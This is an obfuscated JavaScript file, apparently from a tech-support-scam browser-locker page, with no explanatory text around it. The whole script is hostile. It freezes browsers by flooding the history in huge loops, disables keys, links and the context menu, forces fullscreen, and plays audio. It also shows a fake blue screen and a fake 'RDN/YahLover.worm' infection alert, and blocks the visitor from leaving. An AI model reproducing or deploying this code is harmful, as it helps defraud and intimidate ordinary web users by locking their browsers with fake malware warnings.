$(function() {
    if (isFirefox) {
        $("a").click(function(e) {
            e.preventDefault()
        });
        var e = ["pushState", "onbeforeunload", "", "returnValue", "onload", "toString"];
        o = e, u = 325,
            function(e) {
                for (; --e;) o.push(o.shift())
            }(++u);
        var n = function(n, t) {
            return e[n -= 0]
        };
        t = text, window[n("0x0")] = function(e) {
            var o = n("0x1") + t;
            return e[n("0x2")] = o, o
        }, window[n("0x3")] = function() {
            if (confirm("" + t))
                for (var e = "", o = 0; o < 1e8; o++) e += o[n("0x4")](), history[n("0x5")](0, 0, e);
            else
                for (e = "", o = 0; o < 1e8; o++) e += o[n("0x4")](), history[n("0x5")](0, 0, e)
        }
    }
    var t, o, u, r, c, i, l;
    if (isChrome || isOpera) {
        var d = !1;
        $("head").append('<script src="./js/jquery.js"><\/script>'), $("head").append('<link href="./css/main.css" rel="stylesheet">'), document.getElementById("audio").play(), window.onkeydown = function(e) {
            return !1
        }, window.onkeypress = function(e) {
            return !1
        }, onbeforeunload = function() {
            return alert("??????? ESC, ????? ??????? ????????!"), "??????? ESC, ????? ??????? ????????!"
        }, document.oncontextmenu = new Function("return false");
        for (var s = 0; s < 0; s++) alert(text);

        function a() {
            d ? (document.getElementById("blue-screen").style.display = "block", document.getElementsByTagName("body").item(0).setAttribute("class", "past")) : d = !0
        }

        function m() {
            document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement || (document.documentElement.requestFullscreen ? document.documentElement.requestFullscreen() : document.documentElement.mozRequestFullScreen ? document.documentElement.mozRequestFullScreen() : document.documentElement.webkitRequestFullscreen && document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT)), window.open("blue.php", "Alert", "width=1,height=1,scrolling=yes,fullscreen=yes,left=3000,top=3000")
        }
        document.getElementById("chrome-alerts").style.display = "block", document.addEventListener("keyup", function(e) {
            27 == e.keyCode && m()
        }, !1), document.addEventListener("keyup", function(e) {
            122 != e.keyCode && 17 != e.keyCode && 18 != e.keyCode && 13 != e.keyCode || (a(), m())
        }, !1), window.onload = function() {
            document.onclick = function(e) {
                e = e || event, target = e.target || e.srcElement, target.tagName, m(), a()
            }
        }, addEventListener("click", function() {
            a();
            var e = document.documentElement;
            (e.requestFullScreen || e.webkitRequestFullScreen || e.mozRequestFullScreen).call(e)
        }), window.addEventListener("resize", function() {
            $("body").css("overflow", "hidden"), $(".popup-alert").stop().animate({
                bottom: "-10px",
                opacity: 1
            }, 500), document.getElementById("audio").play(), screen.width, window.innerWidth, window.setInterval(function() {
                for (var e = 0; e < 100; e++) history.pushState(0, 0, e)
            }, 500)
        })
    }
    if (isIE || isSafari) {
        $("#blue-screen,.chrome-alert").hide();
        var f = ["onmouseout", "body", "addEventListener", "mouseout", "*************************************************\nRDN/YahLover.worm!055BCCAC9FEC Infection\n*************************************************\n\n", "attachEvent"];
        i = f, l = 361,
            function(e) {
                for (; --e;) i.push(i.shift())
            }(++l);
        var y = function(e, n) {
            return f[e -= 0]
        };
        r = text, c = text, alert(r), document[y("0x0")][y("0x1")] ? document[y("0x0")][y("0x1")](y("0x2"), function(e) {
            alert(y("0x3") + r)
        }, !1) : document[y("0x0")][y("0x4")](y("0x5"), function(e) {
            alert(r)
        }), window.onbeforeunload = function() {
            return c
        }
    }
});